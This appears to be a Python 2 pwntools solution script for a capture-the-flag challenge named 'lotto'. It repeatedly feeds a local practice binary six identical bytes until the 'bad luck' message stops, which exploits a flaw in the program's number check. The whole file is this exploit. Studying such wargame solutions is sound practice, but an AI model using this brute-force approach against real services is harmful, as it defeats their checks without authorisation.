from pwn import *

shell = process('/home/lotto/lotto')
shell.recvuntil('3. Exit')

while True:
	shell.sendline('1')
	shell.recvuntil('bytes : ')
	shell.sendline('      ')

	sleep(1)
	data = shell.recv(1024)

	if not "bad luck" in data:
	    print data
	    break